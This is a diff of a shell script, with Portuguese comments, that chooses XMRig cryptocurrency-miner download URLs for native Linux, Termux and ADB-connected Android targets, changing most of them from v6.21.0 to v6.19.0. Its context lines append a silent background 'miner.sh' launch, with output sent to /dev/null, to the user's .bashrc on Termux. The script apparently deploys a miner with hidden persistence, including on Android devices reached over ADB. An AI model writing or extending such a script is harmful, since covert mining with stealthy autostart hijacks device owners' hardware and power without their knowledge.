@@ -48,19 +48,19 @@ fi
 
 # URL limpa sem espaços ou quebras de linha
 if [ "$IS_NATIVE_APP" = "true" ]; then
-    URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-arm64.tar.gz"
+    URL="https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-linux-static-arm64.tar.gz"
 elif [ "$IS_TERMUX" = "true" ]; then
-    URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-android-arm64.tar.gz"
+    URL="https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-android-arm64.tar.gz"
     if ! grep -q "miner.sh" "$HOME/.bashrc" 2>/dev/null; then
         echo "bash $HOME/miner.sh > /dev/null 2>&1 &" >> "$HOME/.bashrc"
     fi
 elif [ "$IS_ADB_ANDROID" = "true" ]; then
-    URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-arm64.tar.gz"
+    URL="https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-linux-static-arm64.tar.gz"
 else
     if [[ "$ARCH" == "x86_64" ]]; then
         URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"
     else
-        URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-arm64.tar.gz"
+        URL="https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-linux-static-arm64.tar.gz"
     fi
 fi
 
